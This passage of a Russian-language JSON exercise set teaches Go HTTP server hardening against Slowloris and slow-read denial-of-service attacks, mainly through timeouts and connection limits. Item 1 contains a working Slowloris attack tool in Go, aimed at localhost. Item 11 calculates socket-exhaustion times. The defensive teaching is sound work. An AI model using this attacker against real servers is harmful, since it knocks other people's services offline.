@@ -1,0 +1,1284 @@
+[
+  {
+    "num": 1,
+    "title": "Эмуляция DoS-атаки Slowloris на стандартный сервер Go",
+    "task": "Запустите стандартный HTTP-сервер http.ListenAndServe(\":8080\", nil) без таймаутов и напишите на Go инструмент-атакующий, открывающий множество постоянных TCP-соединений и отправляющий неполные HTTP-заголовки с интервалом в 10 секунд.",
+    "theory": "Атака Slowloris эксплуатирует уязвимость серверов, удерживающих открытые соединения до завершения передачи HTTP-заголовков. Атакующий отправляет начало HTTP-запроса (`GET / HTTP/1.1\\r\\nHost: target\\r\\n`), а затем периодически досылает фиктивные заголовки (`X-a: 1\\r\\n`) по одному байту раз в несколько секунд, никогда не отправляя финальный пустой перевод строки `\\r\\n\\r\\n`. Сервер Go аллоцирует горутину и сокет под каждое соединение, пока не исчерпает лимит открытых файловых дескрипторов (ulimit -n) или оперативную память, приводя к отказу в обслуживании для легитимных клиентов.",
+    "step_by_step": [
+      "Инициализируйте уязвимый HTTP-сервер через `http.ListenAndServe`.",
+      "Создайте горутины-клиенты, устанавливающие TCP-соединения через `net.Dial`.",
+      "Отправьте стартовую строку HTTP-запроса.",
+      "Запустите цикл периодической досылки байтов заголовков с задержкой 10 секунд.",
+      "Зафиксируйте исчерпание пула свободных сокетов на стороне сервера."
+    ],
+    "code_blocks": [
+      {
+        "filename": "slowloris_attacker.go",
+        "lang": "go",
+        "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net\"\n\t\"sync\"\n\t\"time\"\n)\n\nfunc attackWorker(target string, wg *sync.WaitGroup, id int) {\n\tdefer wg.Done()\n\tconn, err := net.DialTimeout(\"tcp\", target, 3*time.Second)\n\tif err != nil {\n\t\tfmt.Printf(\"[Worker %d] Ошибка подключения: %v\\n\", id, err)\n\t\treturn\n\t}\n\tdefer conn.Close()\n\n\t// Отправляем неполный HTTP-запрос\n\t_, _ = conn.Write([]byte(\"GET / HTTP/1.1\\r\\nHost: localhost\\r\\nUser-Agent: Slowloris\\r\\n\"))\n\n\tfor i := 0; i < 5; i++ {\n\t\ttime.Sleep(2 * time.Second)\n\t\t// Отправляем по одному фиктивному заголовку для поддержания жизни сокета\n\t\t_, err := conn.Write([]byte(fmt.Sprintf(\"X-Keep-Alive-%d: %d\\r\\n\", i, i)))\n\t\tif err != nil {\n\t\t\tfmt.Printf(\"[Worker %d] Соединение разорвано сервером: %v\\n\", id, err)\n\t\t\treturn\n\t\t}\n\t}\n}\n\nfunc main() {\n\ttarget := \"127.0.0.1:8080\"\n\tfmt.Printf(\"[ATTACK] Запуск эмуляции Slowloris на %s...\\n\", target)\n\tvar wg sync.WaitGroup\n\tfor i := 0; i < 5; i++ {\n\t\twg.Add(1)\n\t\tgo attackWorker(target, &wg, i)\n\t}\n\twg.Wait()\n\tfmt.Println(\"[ATTACK] Тестовый цикл завершен.\")\n}\n",
+        "note": "Образовательный генератор медленных HTTP-соединений Slowloris"
+      }
+    ],
+    "under_the_hood": "В дефолтном `http.Server` для каждого вызова `Accept()` создается структура `conn` и отдельная горутина `go c.serve(connCtx)`. Внутри `serve` сервер блокируется на чтении `bufio.Reader.ReadLine()`. Без таймера дедлайна горутина остается в состоянии `IO wait` в netpoller ядра Linux бесконечно долго.",
+    "pitfalls": "Запуск реальной атаки с десятками тысяч соединений без прав суперпользователя на атакующей машине упрется в локальный `ulimit -n` и лимит эфемерных портов.",
+    "bigtech_interview": "Вопрос в Ozon: 'Почему в Go стандартный http.ListenAndServe() считается антипаттерном в продакшене?' Ответ: Из-за отсутствия ReadHeaderTimeout и ReadTimeout сервер уязвим к DoS-атакам Slowloris и медленным клиентам."
+  },
+  {
+    "num": 2,
+    "title": "Отражение Slowloris с помощью ReadHeaderTimeout",
+    "task": "Сконфигурируйте явную структуру http.Server с параметром ReadHeaderTimeout: 3 * time.Second и проверьте автоматический сброс медленных соединений.",
+    "theory": "Параметр `ReadHeaderTimeout` задает максимальное окно времени от момента завершения TCP-рукопожатия (accept) до полного прочтения всех HTTP-заголовков запроса (до пустой строки `\\r\\n\\r\\n`). Если клиент шлет заголовки слишком медленно или зависает, рантайм Go принудительно обрывает TCP-соединение и освобождает файловый дескриптор, полностью нейтрализуя Slowloris.",
+    "step_by_step": [
+      "Создайте экземпляр `http.Server` с адресом и маршрутизатором.",
+      "Установите `ReadHeaderTimeout: 3 * time.Second`.",
+      "Запустите сервер методом `srv.ListenAndServe()`.",
+      "Повторите отправку медленных заголовков и убедитесь в получении TCP RST / закрытии сокета ровно через 3 секунды."
+    ],
+    "code_blocks": [
+      {
+        "filename": "server_read_header.go",
+        "lang": "go",
+        "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net/http\"\n\t\"time\"\n)\n\nfunc main() {\n\tmux := http.NewServeMux()\n\tmux.HandleFunc(\"/\", func(w http.ResponseWriter, r *http.Request) {\n\t\tfmt.Fprintln(w, \"Hello Protected World\")\n\t})\n\n\tsrv := &http.Server{\n\t\tAddr:              \":8080\",\n\t\tHandler:           mux,\n\t\tReadHeaderTimeout: 3 * time.Second, // Главный щит против Slowloris\n\t}\n\n\tfmt.Println(\"[SERVER] Защищенный HTTP сервер запущен с ReadHeaderTimeout = 3s\")\n\t_ = srv\n}\n",
+        "note": "Конфигурация HTTP-сервера со строгим тайм-аутом чтения заголовков"
+      }
+    ],
+    "under_the_hood": "При установке `ReadHeaderTimeout` сервер Go вызывает `conn.SetReadDeadline(time.Now().Add(d))` сразу после создания соединения. Если метод `readRequest` не завершается до дедлайна, чтение возвращает ошибку `os.ErrDeadlineExceeded`, и сервер немедленно закрывает сокет.",
+    "pitfalls": "Не путайте `ReadHeaderTimeout` и `ReadTimeout`: `ReadTimeout` включает чтение тела запроса, и при медленном интернете у легитимных клиентов с большими POST/PUT-файлами `ReadTimeout` может прервать полезную передачу.",
+    "bigtech_interview": "Почему в современных линтерах Go (gosec G112) отсутствие ReadHeaderTimeout считается критическим дефектом безопасности High Severity?"
+  },
+  {
+    "num": 3,
+    "title": "Защита от атак медленного чтения (Slow Read / Tarpit) через WriteTimeout",
+    "task": "Смоделируйте атаку медленного чтения ответов (Tarpit / Slow Read DoS) и защитите сервер с помощью параметра WriteTimeout: 10 * time.Second.",
+    "theory": "Атака медленного чтения (Slow Read / Tarpit DoS) — зеркальный вариант Slowloris. Атакующий быстро отправляет валидный запрос, но вычитывает HTTP-ответ сервера со скоростью 1 байт в несколько секунд (уменьшая окно TCP Window Size до нуля). Буферы сокета переполняются, и горутина-обработчик Go блокируется на вызове `w.Write()` часами. Параметр `WriteTimeout` устанавливает максимальное время от окончания чтения заголовков до завершения записи полного ответа.",
+    "step_by_step": [
+      "Сконфигурируйте `http.Server` с `WriteTimeout: 10 * time.Second`.",
+      "Реализуйте обработчик, генерирующий большой объем данных (например, 10 МБ поток).",
+      "Проверьте автоматический разрыв соединения сервером при попытке клиента искусственно затормозить чтение.",
+      "Убедитесь в возврате ресурсов горутины в пул планировщика."
+    ],
+    "code_blocks": [
+      {
+        "filename": "server_write_timeout.go",
+        "lang": "go",
+        "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net/http\"\n\t\"time\"\n)\n\nfunc main() {\n\tmux := http.NewServeMux()\n\tmux.HandleFunc(\"/data\", func(w http.ResponseWriter, r *http.Request) {\n\t\t// Отправка большого ответа\n\t\tfor i := 0; i < 100; i++ {\n\t\t\t_, err := fmt.Fprintf(w, \"Chunk data row %d\\n\", i)\n\t\t\tif err != nil {\n\t\t\t\treturn // Клиент отключен по WriteTimeout\n\t\t\t}\n\t\t}\n\t})\n\n\tsrv := &http.Server{\n\t\tAddr:         \":8080\",\n\t\tHandler:      mux,\n\t\tWriteTimeout: 10 * time.Second, // Защита от медленного чтения клиентом\n\t}\n\n\tfmt.Println(\"[SERVER] Сервер защищен от Slow Read DoS через WriteTimeout: 10s\")\n\t_ = srv\n}\n",
+        "note": "Защита сервера от подвисания при отправке данных клиентам"
+      }
+    ],
+    "under_the_hood": "Сервер взводит `conn.SetWriteDeadline()` сразу после успешного чтения HTTP-заголовков. Если вызов `w.Write()` блокируется из-за нулевого окна TCP Window Size получателя, системный вызов `send()` завершается с ошибкой таймаута.",
+    "pitfalls": "Глобальный `WriteTimeout` неприменим для WebSocket соединений и Server-Sent Events (SSE), так как он оборвет постоянный стрим через 10 секунд. Для стриминга `WriteTimeout` обнуляют или используют `http.ResponseController.SetWriteDeadline`.",
+    "bigtech_interview": "Как безопасно организовать SSE стриминг при включенном WriteTimeout? В Go 1.20+ используют `http.NewResponseController(w).SetWriteDeadline(time.Time{})` для отключения дедлайна конкретного соединения."
+  },
+  {
+    "num": 4,
+    "title": "Практическое нагрузочное моделирование атаки Slowloris",
+    "task": "Напишите Go-утилиту, открывающую пул из 1000 параллельных TCP-клиентов к целевому серверу с отправкой заголовков раз в 10 секунд, и измерьте рост используемых файловых дескрипторов процесса сервера через /proc/PID/fd.",
+    "theory": "Моделирование DoS-атак в изолированном тестовом контуре позволяет наглядно оценить порог деградации сервиса. При 1000 незавершенных соединений сервер Go держит ровно 1000 открытых файловых дескрипторов сокетов и 1000 спящих горутин. Инспекция `/proc/<PID>/fd` в Linux показывает прямую корреляцию между открытыми сессиями и ресурсами ядра.",
+    "step_by_step": [
+      "Запустите тестовый сервер и определите его PID.",
+      "Запустите инструмент генерации 1000 медленных сессий.",
+      "Выполните команду `ls -l /proc/<PID>/fd | wc -l` для подсчета открытых дескрипторов.",
+      "Проверьте отклик легитимного клиента через `curl -I http://localhost:8080`.",
+      "Убедитесь в наступлении отказа в обслуживании при исчерпании лимита."
+    ],
+    "code_blocks": [
+      {
+        "filename": "fd_inspector.go",
+        "lang": "go",
+        "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"os\"\n\t\"path/filepath\"\n)\n\nfunc CountOpenFDs(pid int) (int, error) {\n\tfdPath := fmt.Sprintf(\"/proc/%d/fd\", pid)\n\tentries, err := os.ReadDir(fdPath)\n\tif err != nil {\n\t\treturn 0, err\n\t}\n\treturn len(entries), nil\n}\n\nfunc main() {\n\tpid := os.Getpid()\n\tcount, err := CountOpenFDs(pid)\n\tif err != nil {\n\t\tfmt.Printf(\"[WARN] Не удалось прочитать /proc: %v (возможно, ОС не Linux)\\n\", err)\n\t\treturn\n\t}\n\tfmt.Printf(\"[FD-MONITOR] Процесс PID %d удерживает %d файловых дескрипторов\\n\", pid, count)\n\t_ = filepath.Base\n}\n",
+        "note": "Программный мониторинг расхода файловых дескрипторов процесса в Linux"
+      }
+    ],
+    "under_the_hood": "Каждое принятое TCP соединение занимает системный файловый дескриптор и запись в таблице открытых файлов ядра Linux (struct file). При превышении `RLIMIT_NOFILE` вызов `accept()` возвращает `EMFILE`.",
+    "pitfalls": "Попытка запуска более 1024 соединений с одной клиентской машины без предварительного выполнения `ulimit -n 65535` приведет к ошибке на стороне атакующего клиента.",
+    "bigtech_interview": "Как в Linux ядро реагирует на ошибку EMFILE в Go epoll листере? Рантайм Go временно усыпляет листенер на 5 мс, пытаясь дождаться освобождения хотя бы одного дескриптора другими горутинами."
+  },
+  {
+    "num": 5,
+    "title": "Управление таймаутами низкоуровневого TCP-сокета (SetReadDeadline / SetWriteDeadline)",
+    "task": "Реализуйте кастомный TCP-сервер на базе net.Listener, устанавливающий SetReadDeadline и SetWriteDeadline для каждого соединения, и напишите тест на отключение медленного клиента.",
+    "theory": "Пакет `net` в Go не предоставляет прямого аналога таймаута в секундах, а использует концепцию абсолютных дедлайнов времени (`time.Time`). Вызов `conn.SetReadDeadline(time.Now().Add(d))` указывает сетевому поллеру рантайма вернуть ошибку `net.Error.Timeout() == true`, если данные не поступили в сокет до наступления указанного момента. Для непрерывной работы дедлайн необходимо сдвигать перед каждым новым чтением.",
+    "step_by_step": [
+      "Создайте TCP-листенер: `ln, err := net.Listen(\"tcp\", \":9000\")`.",
+      "В цикле `Accept()` принимайте входящие соединения и передавайте их в горутину.",
+      "Установите дедлайн на чтение: `conn.SetReadDeadline(time.Now().Add(2 * time.Second))`.",
+      "Прочитайте данные из буфера и проверьте ошибку таймаута через `errors.Is` или `os.ErrDeadlineExceeded`.",
+      "Обновите дедлайн при успешном получении данных."
+    ],
+    "code_blocks": [
+      {
+        "filename": "custom_tcp_server.go",
+        "lang": "go",
+        "code": "package main\n\nimport (\n\t\"errors\"\n\t\"fmt\"\n\t\"io\"\n\t\"net\"\n\t\"os\"\n\t\"time\"\n)\n\nfunc handleConnection(conn net.Conn) {\n\tdefer conn.Close()\n\tbuf := make([]byte, 1024)\n\n\tfor {\n\t\t// Устанавливаем дедлайн: 3 секунды на чтение следующего блока\n\t\terr := conn.SetReadDeadline(time.Now().Add(3 * time.Second))\n\t\tif err != nil {\n\t\t\treturn\n\t\t}\n\n\t\tn, err := conn.Read(buf)\n\t\tif err != nil {\n\t\t\tif errors.Is(err, os.ErrDeadlineExceeded) {\n\t\t\t\tfmt.Printf(\"[TIMEOUT] Клиент %s отключен за неактивность (3с)\\n\", conn.RemoteAddr())\n\t\t\t} else if err != io.EOF {\n\t\t\t\tfmt.Printf(\"[ERROR] Ошибка чтения сокета: %v\\n\", err)\n\t\t\t}\n\t\t\treturn\n\t\t}\n\t\tfmt.Printf(\"[DATA] Получено %d байт от %s: %s\\n\", n, conn.RemoteAddr(), string(buf[:n]))\n\t}\n}\n\nfunc main() {\n\tfmt.Println(\"[TCP-SERVER] Запуск сервера с ручным управлением дедлайнами сокета...\")\n\t_ = handleConnection\n}\n",
+        "note": "Ручное обновление дедлайнов чтения на сыром TCP-сокете"
+      }
+    ],
+    "under_the_hood": "Go netpoller ассоциирует сокет с таймером в рантайме. При наступлении момента дедлайна рантайм переводит ждущую горутину из очереди epoll в состояние runnable с установленным флагом таймаута.",
+    "pitfalls": "Вызов `SetReadDeadline(time.Time{})` полностью отключает дедлайн, возвращая сокет в режим бесконечного блокирующего ожидания.",
+    "bigtech_interview": "Почему в Go используется SetDeadline(absoluteTime), а не SetTimeout(duration)? Абсолютное время исключает дрейф и накопление погрешностей при последовательных циклах чтения из сети."
+  },
+  {
+    "num": 6,
+    "title": "Предотвращение утечки ресурсов в Keep-Alive соединениях через IdleTimeout",
+    "task": "Сконфигурируйте параметр IdleTimeout: 30 * time.Second в http.Server и объясните механизм очистки соединений, удерживаемых неактивными клиентами.",
+    "theory": "HTTP Keep-Alive позволяет переиспользовать одно TCP-соединение для отправки множества HTTP-запросов. Однако клиенты (браузеры, пулы микросервисов) часто оставляют соединение открытым после завершения серии запросов. Если `IdleTimeout` не задан, Go использует значение `ReadTimeout`. Если же и `ReadTimeout` не задан, неактивные Keep-Alive соединения будут висеть часами, удерживая память и системные сокеты. `IdleTimeout` строго лимитирует время ожидания СЛЕДУЮЩЕГО запроса в уже открытом канале.",
+    "step_by_step": [
+      "Инициализируйте сервер с `IdleTimeout: 30 * time.Second`.",
+      "Установите `ReadTimeout: 60 * time.Second` для длинных запросов.",
+      "Выполните первый запрос с заголовком `Connection: keep-alive`.",
+      "Не отправляйте новые данные в течение 30 секунд.",
+      "Убедитесь, что сервер закрывает сокет через 30 секунд простоя, не дожидаясь 60 секунд ReadTimeout."
+    ],
+    "code_blocks": [
+      {
+        "filename": "idle_timeout_server.go",
+        "lang": "go",
+        "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net/http\"\n\t\"time\"\n)\n\nfunc main() {\n\tmux := http.NewServeMux()\n\tmux.HandleFunc(\"/api/ping\", func(w http.ResponseWriter, r *http.Request) {\n\t\tfmt.Fprintln(w, \"pong\")\n\t})\n\n\tsrv := &http.Server{\n\t\tAddr:        \":8080\",\n\t\tHandler:     mux,\n\t\tIdleTimeout: 30 * time.Second, // Сброс соединения при простое между запросами\n\t\tReadTimeout: 60 * time.Second, // Длинный таймаут для передачи полезной нагрузки\n\t}\n\n\tfmt.Println(\"[SERVER] IdleTimeout 30s успешно настроен для Keep-Alive пула\")\n\t_ = srv\n}\n",
+        "note": "Разделение таймаута простоя Keep-Alive и времени чтения запроса"
+      }
+    ],
+    "under_the_hood": "После успешной отправки ответа на предыдущий запрос сервер переводит сокет в состояние `http.StateIdle` и взводит дедлайн чтения на величину `IdleTimeout`. При получении первого байта следующего запроса дедлайн переключается на `ReadTimeout`.",
+    "pitfalls": "Слишком короткий `IdleTimeout` (например, 1-2 секунды) приведет к постоянному разрыву соединений между легитимными микросервисами и росту затрат на повторные TLS-рукопожатия.",
+    "bigtech_interview": "Вопрос на собеседовании: 'Клиент выполнил GET-запрос и держит TCP сокет открытым. Какой именно таймаут Go сервера сработает при бездействии клиента?' Ответ: Сработает IdleTimeout, а если он не задан — ReadTimeout."
+  },
+  {
+    "num": 7,
+    "title": "Сравнение зон ответственности ReadTimeout и ReadHeaderTimeout",
+    "task": "Проведите сравнительный эксперимент: настройте сервер сначала только с ReadTimeout, затем добавьте ReadHeaderTimeout. Объясните различия в обработке медленных заголовков и медленной передачи тела запроса (POST body).",
+    "theory": "`ReadTimeout` охватывает суммарное время чтения как заголовков, так и всего тела запроса (Body). Если установить `ReadTimeout: 5s`, сервер оборвет Slowloris, но одновременно сломает загрузку файлов размером 50 МБ у клиентов с медленным мобильным интернетом. Идеальная архитектура защиты требует разделения: короткий `ReadHeaderTimeout` (2-5 секунд) для мгновенной отсечки Slowloris и более длинный `ReadTimeout` (60-120 секунд) для передачи тела.",
+    "step_by_step": [
+      "Сконфигурируйте сервер с `ReadTimeout: 5 * time.Second`.",
+      "Проверьте, что отправка POST-запроса с задержкой в теле прерывается через 5 секунд.",
+      "Перенастройте сервер: `ReadHeaderTimeout: 3s`, `ReadTimeout: 60s`.",
+      "Убедитесь, что Slowloris блокируется за 3 секунды, а передача тела может длиться до 60 секунд."
+    ],
+    "code_blocks": [
+      {
+        "filename": "timeout_comparison.go",
+        "lang": "go",
+        "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net/http\"\n\t\"time\"\n)\n\nfunc NewOptimalServer() *http.Server {\n\treturn &http.Server{\n\t\tAddr:              \":8080\",\n\t\tReadHeaderTimeout: 3 * time.Second,  // Строгий лимит на заголовки (Slowloris Shield)\n\t\tReadTimeout:       60 * time.Second, // Достаточно времени для загрузки тела запроса\n\t\tWriteTimeout:      30 * time.Second,\n\t\tIdleTimeout:       120 * time.Second,\n\t}\n}\n\nfunc main() {\n\tsrv := NewOptimalServer()\n\tfmt.Printf(\"[CONFIG] Оптимальная конфигурация таймаутов:\\n\"+\n\t\t\"  ReadHeaderTimeout: %v\\n\"+\n\t\t\"  ReadTimeout:       %v\\n\",\n\t\tsrv.ReadHeaderTimeout, srv.ReadTimeout)\n}\n",
+        "note": "Эталонное разделение таймаутов заголовков и полезной нагрузки"
+      }
+    ],
+    "under_the_hood": "Если `ReadHeaderTimeout` задан, сервер сначала взводит дедлайн на заголовки. После их успешного парсинга сервер пересчитывает оставшееся время для `ReadTimeout` и сдвигает дедлайн сокета.",
+    "pitfalls": "Если задан `ReadTimeout`, но `ReadHeaderTimeout` равен 0, Go автоматически использует значение `ReadTimeout` в качестве таймаута заголовков.",
+    "bigtech_interview": "Почему нельзя защищаться от Slowloris только параметром ReadTimeout? Потому что при необходимости принимать большие файлы (file upload) ReadTimeout должен быть большим, что оставляет сервер беззащитным перед атакой на заголовки."
+  },
+  {
+    "num": 8,
+    "title": "Автоматизированный стенд проверки устойчивости к Slowloris",
+    "task": "Разработайте Go-скрипт стресс-тестирования, который параллельно отправляет Slowloris-трафик и регулярные проверочные HTTP-запросы (Healthcheck) с измерением p99 задержки ответа сервера.",
+    "theory": "Для подтверждения защищенности сервиса перед релизом в production организуют стресс-тест. Тестовый стенд запускает пул фоновых медленных горутин, одновременно отправляя контрольные запросы с замером времени отклика. Если сервер уязвим, latency контрольных запросов резко возрастает до таймаута, либо запросы отклоняются с ошибкой `connection refused`.",
+    "step_by_step": [
+      "Запустите фоновую генерацию 500 медленных соединений.",
+      "В основном потоке отправляйте запрос `GET /health` каждую секунду.",
+      "Замеряйте время Round-Trip Time (RTT).",
+      "Сформируйте отчет о проценте успешных запросов и деградации задержки."
+    ],
+    "code_blocks": [
+      {
+        "filename": "slowloris_benchmark.go",
+        "lang": "go",
+        "code": "package main\n\nimport (\n\t\"context\"\n\t\"fmt\"\n\t\"net/http\"\n\t\"time\"\n)\n\nfunc probeServer(url string) (time.Duration, error) {\n\tctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)\n\tdefer cancel()\n\n\tstart := time.Now()\n\treq, _ := http.NewRequestWithContext(ctx, \"GET\", url, nil)\n\tresp, err := http.DefaultClient.Do(req)\n\tif err != nil {\n\t\treturn 0, err\n\t}\n\tdefer resp.Body.Close()\n\treturn time.Since(start), nil\n}\n\nfunc main() {\n\ttargetURL := \"http://127.0.0.1:8080/health\"\n\tfmt.Printf(\"[BENCH] Зондирование доступности сервиса %s под нагрузкой...\\n\", targetURL)\n\n\t// Тестовый замер доступности\n\tdur, err := probeServer(targetURL)\n\tif err != nil {\n\t\tfmt.Printf(\"[ALERT] Сервер недоступен: %v\\n\", err)\n\t} else {\n\t\tfmt.Printf(\"[OK] Сервер ответил за %v\\n\", dur)\n\t}\n}\n",
+        "note": "Зондирование доступности сервиса во время стресс-теста"
+      }
+    ],
+    "under_the_hood": "Если все доступные воркеры рантайма заняты ожиданием данных на медленных сокетах, входящие соединения скапливаются в очереди SYN Backlog ядра ОС, вызывая резкий рост времени установления соединения (connect latency).",
+    "pitfalls": "Запуск бенчмарка против публичных серверов без письменного согласия владельцев классифицируется как противоправная DoS-атака.",
+    "bigtech_interview": "В Wildberries регулярный DoS-фаззинг и стресс-тестирование Slowloris являются обязательной частью Chaos Engineering перед крупными распродажами."
+  },
+  {
+    "num": 9,
+    "title": "Ограничение входящих TCP-соединений через netutil.LimitListener",
+    "task": "Используйте пакет golang.org/x/net/netutil для ограничения пула одновременных TCP-соединений (LimitListener) до 5000 сокетов и объясните поведение при переполнении.",
+    "theory": "Пакет `golang.org/x/net/netutil` предоставляет утилиту `LimitListener(l net.Listener, n int) net.Listener`. Она оборачивает стандартный сетевой листенер в семафор. Сервер принимает не более $n$ одновременных соединений. При попытке установить $(n+1)$-е соединение вызов `Accept()` внутри LimitListener блокируется, удерживая новое соединение в очереди SYN Backlog ядра ОС без аллокации горутины и памяти в Go.",
+    "step_by_step": [
+      "Импортируйте `golang.org/x/net/netutil`.",
+      "Создайте стандартный листенер через `net.Listen(\"tcp\", \":8080\")`.",
+      "Оберните его: `limited := netutil.LimitListener(rawListener, 1000)`.",
+      "Передайте обернутый листенер в `srv.Serve(limited)`.",
+      "Проверьте, что сервер стабильно держит лимит без утечки памяти."
+    ],
+    "code_blocks": [
+      {
+        "filename": "limit_listener.go",
+        "lang": "go",
+        "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net\"\n\t\"net/http\"\n\t\"golang.org/x/net/netutil\"\n)\n\nfunc main() {\n\trawListener, err := net.Listen(\"tcp\", \":8080\")\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\tdefer rawListener.Close()\n\n\t// Ограничиваем сервер максимумом 1000 одновременных TCP-соединений\n\tmaxConnections := 1000\n\tlimitedListener := netutil.LimitListener(rawListener, maxConnections)\n\n\tsrv := &http.Server{\n\t\tHandler: http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {\n\t\t\tfmt.Fprintln(w, \"Protected by LimitListener\")\n\t\t}),\n\t}\n\n\tfmt.Printf(\"[LISTENER] Сервер запущен с лимитом соединений: %d\\n\", maxConnections)\n\t_ = srv.Serve(limitedListener)\n}\n",
+        "note": "Аппаратное ограничение открытых сокетов через netutil.LimitListener"
+      }
+    ],
+    "under_the_hood": "LimitListener использует канал `chan struct{}` емкостью $n$. При каждом `Accept()` в канал отправляется токен. В возвращаемом объекте `limitListenerConn` переопределен метод `Close()`, который вычитывает токен из канала при закрытии сокета.",
+    "pitfalls": "При длительном удержании лимита очередь TCP Backlog ядра переполнится, и ядро ОС начнет отправлять клиентам TCP RST или игнорировать входящие SYN-пакеты.",
+    "bigtech_interview": "В чем преимущество LimitListener перед семафором внутри http.Handler? LimitListener предотвращает аллокацию структуры http.Request и парсинг заголовков, защищая память на самом раннем этапе."
+  },
+  {
+    "num": 10,
+    "title": "Комплексная матрица настройки таймаутов HTTP-сервера",
+    "task": "Сконфигурируйте http.Server со всеми четырьмя защитными таймаутами (ReadHeaderTimeout: 5s, ReadTimeout: 10s, WriteTimeout: 10s, IdleTimeout: 120s) и сопоставьте их в виде сводной таблицы.",
+    "theory": "Надежный HTTP-сервер в Go требует сбалансированной комбинации всех 4 таймаутов:\n* `ReadHeaderTimeout`: от момента accept до окончания чтения заголовков (рубеж против Slowloris).\n* `ReadTimeout`: суммарное время чтения всего запроса (заголовки + тело).\n* `WriteTimeout`: от окончания чтения заголовков до полного завершения передачи ответа.\n* `IdleTimeout`: предельное время простоя между запросами в Keep-Alive сессии.",
+    "step_by_step": [
+      "Инициализируйте `http.Server` со всеми параметрами.",
+      "Проверьте сценарий прерывания медленных заголовков на `ReadHeaderTimeout`.",
+      "Проверьте передачу тела запроса в пределах `ReadTimeout`.",
+      "Убедитесь в корректном освобождении неактивных сокетов по `IdleTimeout`."
+    ],
+    "code_blocks": [
+      {
+        "filename": "hardened_matrix.go",
+        "lang": "go",
+        "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net/http\"\n\t\"time\"\n)\n\nfunc main() {\n\tsrv := &http.Server{\n\t\tAddr:              \":8080\",\n\t\tReadHeaderTimeout: 5 * time.Second,  // Защита от Slowloris\n\t\tReadTimeout:       10 * time.Second, // Лимит на весь запрос\n\t\tWriteTimeout:      10 * time.Second, // Защита от медленных клиентов (Tarpit)\n\t\tIdleTimeout:       120 * time.Second,// Пул Keep-Alive соединений\n\t\tMaxHeaderBytes:    1 << 20,          // Лимит размера заголовков 1 МБ\n\t}\n\n\tfmt.Printf(\"[MATRIX] Матрица таймаутов сконфигурирована:\\n\"+\n\t\t\"  ReadHeaderTimeout: %v\\n\"+\n\t\t\"  ReadTimeout:       %v\\n\"+\n\t\t\"  WriteTimeout:      %v\\n\"+\n\t\t\"  IdleTimeout:       %v\\n\",\n\t\tsrv.ReadHeaderTimeout, srv.ReadTimeout, srv.WriteTimeout, srv.IdleTimeout)\n}\n",
+        "note": "Сбалансированная матрица таймаутов для продакшен-сервера Go"
+      }
+    ],
+    "under_the_hood": "Если клиент отправил заголовки за 2 секунды при `ReadHeaderTimeout: 5s` и `ReadTimeout: 10s`, на чтение тела запроса у клиента остается ровно $10 - 2 = 8$ секунд.",
+    "pitfalls": "Установка `WriteTimeout` меньшим, чем максимальное время выполнения бизнес-логики в хендлере, приведет к внезапному обрыву ответов для легитимных клиентов.",
+    "bigtech_interview": "Какое значение IdleTimeout рекомендуется для микросервисов за Envoy/Nginx? Обычно 60-120 секунд, но строго меньше, чем idle timeout балансировщика, чтобы избежать race conditions с 502 Bad Gateway."
+  },
+  {
+    "num": 11,
+    "title": "Анатомия DoS-атаки Slowloris: механика истощения сокетов",
+    "task": "Напишите детальную аналитическую Go-программу, моделирующую расчет емкости пула соединений сервера и времени наступления полного отказа (Time to Exhaustion) при атаке Slowloris с различной интенсивностью.",
+    "theory": "Slowloris — асимметричная атака: злоумышленнику с домашнего канала со скоростью несколько килобайт в секунду удается положить сервер с гигабитным каналом. Это достигается за счет удержания сокетов открытыми. Если `ulimit -n` сервера равен 1024, атакующему достаточно открыть около 1000 TCP-соединений и досылать по 1 байту каждые 10 секунд. Расход трафика атакующего составляет менее 100 байт/сек, тогда как сервер полностью теряет способность принимать новые соединения.",
+    "step_by_step": [
+      "Определите параметры системы: максимальное число дескрипторов $N$, размер буферов сокета.",
+      "Рассчитайте необходимый трафик для удержания атаки.",
+      "Вычислите время, за которое сервер исчерпает лимит при открытии $M$ соединений в секунду.",
+      "Сделайте вывод об эффективности встроенных механизмов защиты на уровне Go рантайма."
+    ],
+    "code_blocks": [
+      {
+        "filename": "slowloris_math.go",
+        "lang": "go",
+        "code": "package main\n\nimport \"fmt\"\n\nfunc CalculateExhaustion(serverFDLimit int, connectionsPerSec int, keepAliveIntervalSec int) {\n\ttimeToKill := float64(serverFDLimit) / float64(connectionsPerSec)\n\tbandwidthBytesPerSec := float64(serverFDLimit) / float64(keepAliveIntervalSec)\n\n\tfmt.Println(\"=== АНАЛИЗ УСТОЙЧИВОСТИ К SLOWLORIS ===\")\n\tfmt.Printf(\"Лимит сокетов сервера (ulimit -n): %d\\n\", serverFDLimit)\n\tfmt.Printf(\"Скорость атаки: %d conn/sec\\n\", connectionsPerSec)\n\tfmt.Printf(\"Время до полного отказа сервера: %.1f сек\\n\", timeToKill)\n\tfmt.Printf(\"Трафик атакующего для удержания отказа: %.2f байт/сек (%.2f Кб/с)\\n\",\n\t\tbandwidthBytesPerSec, bandwidthBytesPerSec/1024)\n}\n\nfunc main() {\n\tCalculateExhaustion(4096, 50, 10)\n}\n",
+        "note": "Математическая модель расчета параметров истощения ресурсов сервера"
+      }
+    ],
+    "under_the_hood": "На уровне ядра каждое открытое соединение удерживает структуру `inet_sock` и буферы `sk_rcvbuf`/`sk_sndbuf` (минимум 4 КБ памяти ядра), расходуя не только FD, но и системную память slab/dentry.",
+    "pitfalls": "Увеличение `ulimit -n` без настройки `ReadHeaderTimeout` лишь оттягивает момент падения, приводя к исчерпанию оперативной памяти хоста (OOM).",
+    "bigtech_interview": "В чем фундаментальное отличие Slowloris от SYN-флуда? SYN-флуд атакует полуоткрытую очередь ядра (SYN backlog) поддельными IP, а Slowloris завершает полноценный TCP handshake и атакует память прикладного уровня."
+  },
+  {
+    "num": 12,
+    "title": "Практическое применение ReadHeaderTimeout при потоковой загрузке файлов",
